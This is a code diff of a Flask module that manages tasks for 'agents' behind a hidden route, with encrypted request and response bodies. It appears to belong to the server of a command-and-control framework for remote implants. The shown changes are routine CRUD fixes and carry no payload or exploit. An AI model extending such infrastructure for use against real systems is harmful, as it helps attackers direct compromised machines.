@@ -79,7 +79,7 @@ def create_registering_task(agent_name):
 def delete_registering_task():
     task_uid = request.args.get("task_uid")
     task = OnRegisteringTask.query.filter_by(task_uid = task_uid).first()
-
+    #print(task_uid)
     try:
         db.session.delete(task)
         db.session.commit()
@@ -185,7 +185,7 @@ def list_agent_tasks():
 
 
 # delete all tasks for an  agent
-@task.route(config["hidden_route"] + config["endpoints"]["task"], methods=['DELETE'])
+@task.route(config["hidden_route"] + config["endpoints"]["tasks"], methods=['DELETE'])
 @login_required
 def delete_all_tasks():
     try:
@@ -203,10 +203,36 @@ def delete_all_tasks():
             db.session.delete(task)
             db.session.commit()
         except Exception as e:
-            print("[-] Error in delete_agent()")
-            print("[-] Cannot delete the agent")
+            print("[-] Error in delete_all_tasks()")
+            print("[-] Cannot delete the agent and associated tasks")
             print(str(e))
             return encrypt("[-] Cannot delete the task: " + task.task_uid + " for the agent: " + task.agent_uid)
     
 
     return encrypt("[+] All tasks deleted for the agent: " + agent_uid)
+
+# delete a task
+@task.route(config["hidden_route"] + config["endpoints"]["task"], methods=['DELETE'])
+@login_required
+def delete_task():
+    try:
+        content = request.data
+        task_uid = decrypt(content)
+    except Exception as e:
+        print("[-] Error in delete_task()")
+        print(str(e))
+        return encrypt("[-] Cannot decrypt the request")
+
+
+    task = Task.query.filter_by(task_uid=task_uid).first()
+    
+    try:
+        db.session.delete(task)
+        db.session.commit()
+    except Exception as e:
+        print("[-] Error in delete_task()")
+        print("[-] Cannot delete the task: " + task_uid)
+        print(str(e))
+        return encrypt("[-] Cannot delete the task: " + task_uid + " for the agent: " + task.agent_uid)
+    
+    return encrypt("[+] Task " + task_uid + " deleted for the agent: " + task.agent_uid)
